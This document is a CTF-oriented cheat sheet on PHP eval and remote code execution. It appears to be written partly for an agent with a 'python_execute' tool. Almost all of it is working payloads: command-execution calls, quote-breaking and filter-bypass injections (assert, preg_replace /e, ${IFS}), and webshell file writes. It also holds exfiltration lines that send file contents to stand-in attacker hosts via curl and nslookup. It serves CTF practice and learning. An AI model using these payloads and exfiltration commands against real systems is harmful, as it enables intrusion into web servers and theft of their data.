# eval and RCE Techniques Compendium

## PHP Code-Execution Function Comparison

| Function | Echo | Usage |
|------|------|------|
| `system($cmd)` | **yes** (outputs directly to stdout) | `system("id")` -> see the result right on the page |
| `passthru($cmd)` | **yes** (raw binary output) | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **none** (stored in the `$out` array) | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **none** (returns a string) | `echo shell_exec("id")` |
| `` `$cmd` `` | **none** (equivalent to shell_exec) | `` echo `id` `` |
| `popen($cmd, 'r')` | **none** (needs fread) | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | depends on the code | `eval("system('id');")` -> has echo |

## highlight_file and eval Output Order

This is a common trap in CTFs:

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

**Key understanding:**
- `highlight_file()` outputs the highlighted source -> this is the first step
- The `system()` output inside `eval()` -> this is the second step
- Both are in the **same HTTP response**; the command result comes **after** the highlighted source
- `system()`'s output is written directly to stdout and is **not "blocked" by highlight_file**

**How to search for the flag:**
- Look for the flag at the **end** of the HTTP response
- `highlight_file`'s HTML output is long; the flag is usually at the very end
- Use `python_execute` to parse the response and look at only the last few hundred chars

```python
import requests
r = requests.get(url, params={"cmd": "system('cat flag.php');"})
# The flag is at the end of r.text, not in the highlighted source
print(r.text[-500:])  # look at only the last 500 chars
```

## eval Bypass Techniques

### 1. Semicolon Bypass

```php
// if eval needs a semicolon but input is filtered
eval($_GET['cmd']);  // normal usage
// input: system('id')  // no semicolon needed; eval adds it
// or input: system('id');//
```

### 2. PHP Closing Tag

```php
// if the eval content is wrapped
eval("echo '" . $_GET['cmd'] . "';");
// input: ');system('id');//
// result: eval("echo '');system('id');//';");
```

### 3. assert() Injection

```php
// assert() can execute code before PHP 7
assert("system('id')");  // PHP < 7.x
// In PHP 7+, assert becomes a language construct and no longer executes strings
```

### 4. preg_replace /e Modifier

```php
// In PHP < 7.0, preg_replace /e executes the replacement result
preg_replace('/test/e', 'system("id")', 'test');
// arbitrary regex + /e + controllable replacement string -> RCE
```

## No-Echo RCE Exploitation

### Method 1: Write a File to the Web Directory
```bash
system("cat flag.php > /var/www/html/x.txt");
# Then visit http://target/x.txt
```

### Method 2: DNS/HTTP Exfiltration
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### Method 3: Write a PHP File, Then Read It
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# Then visit http://target/read.php
```

### Method 4: Environment Variable + Another Vulnerability
```bash
# Write the result into the cookie/session
system("export FLAG=$(cat flag.php)");
# Read via phpinfo() or /proc/self/environ
```

## PHP Code-Execution Chain Construction

### Exploit Chains from Simple to Complex

1. **Direct execution**: `system("id")` -> has echo
2. **No-echo file write**: `system("cat flag.php > /var/www/html/x")`
3. **No-echo exfiltration**: `system("curl http://evil/$(cat flag.php)")`
4. **No-echo blind**: `system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### Common CTF eval Scenarios

| Scenario | Code pattern | Bypass method |
|------|---------|---------|
| Simple eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + space filter | `eval($cmd)` + spaces replaced | `system('cat${IFS}flag.php')` |
| eval + keyword filter | `eval($cmd)` + flag replaced | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | look at the **end of the page** |
| eval + length limit | `strlen($cmd) > N` | use variables / short function names |
| assert injection | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | inject code in the replacement string |
